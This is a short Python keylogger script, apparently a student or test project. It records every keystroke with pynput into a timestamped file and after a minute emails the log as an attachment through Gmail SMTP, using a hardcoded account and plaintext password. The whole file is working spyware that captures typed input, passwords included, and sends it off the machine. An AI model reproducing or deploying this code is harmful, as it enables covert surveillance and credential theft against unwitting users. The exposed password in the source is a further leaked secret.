import datetime
from pynput.keyboard import Listener
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import ssl
import subprocess

def key_list():
    Date = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = 'keylogger_{}.txt'.format(Date)

    f = open(filename, 'w')

    t0 = time.time()

    def key_recorder(key):
        key = str(key)
        if key == 'Key.enter':
            f.write('\n')
        elif key == 'Key.space':
            f.write(key.replace('Key.space', ' '))
        elif key == 'Key.backspace':
            f.write(key.replace("Key.backspace", "%BORRAR%"))
        elif key == '<65027>':
            f.write('%ARROBA%')
        elif key == "'\\x03'":
            f.write('\n\nSaliendo del keylogger . . .')
            f.close()
            quit()
        else:
            f.write(key.replace("'", ""))

        if time.time()-t0 > 60:
            f.close()
            MAILsend(filename)
            quit()

    with Listener(on_press=key_recorder) as listener:
        listener.join()

def MAILsend(filename):
    SendMail = "pruebas.fcfm.jlsti@gmail.com"
    password = "A20HlmZ13"
    reciveMail = "pruebas.fcfm.jlsti@gmail.com"
    text = "Mensaje con informacion del usuario"

    message = MIMEMultipart("alternative")
    message["Subject"] = "Reporte"
    message["From"] = SendMail
    message["To"] = reciveMail

    text = MIMEText(text, "plain")

    with open(filename, "rb") as attachment:
        # The content type "application/octet-stream" means that a MIME attachment is a binary file
        part2 = MIMEBase("application", "octet-stream")
        part2.set_payload(attachment.read())

    # Encode to base64
    encoders.encode_base64(part2)

    # Add header
    part2.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    # Add HTML/plain-text parts to MIMEMultipart message
    message.attach(text)
    message.attach(part2)

    # Create secure connection with server and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(SendMail, password)
        server.sendmail(
            SendMail, reciveMail, message.as_string()
        )

if __name__ == '__main__':
    key_list()